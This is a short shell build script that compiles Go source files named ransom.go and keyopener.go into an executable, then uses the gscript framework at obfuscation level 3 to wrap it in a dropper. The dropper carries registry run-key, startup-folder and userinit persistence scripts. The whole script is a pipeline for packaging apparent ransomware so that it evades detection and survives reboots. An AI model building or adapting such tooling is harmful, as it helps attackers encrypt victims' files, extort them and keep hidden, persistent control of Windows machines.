#!/usr/bin/env sh
rm *_gscript.exe
go-bindata data/*
go build ransom.go bindata.go keyopener.go
mv ransom.exe rw.exe
gscript --debug compile --enable-logging --obfuscation-level 3 drop.gs runkey_persistence.gs startup_persistence.gs userinit_persistence.gs;
mv $TEMP/*_gscript.exe .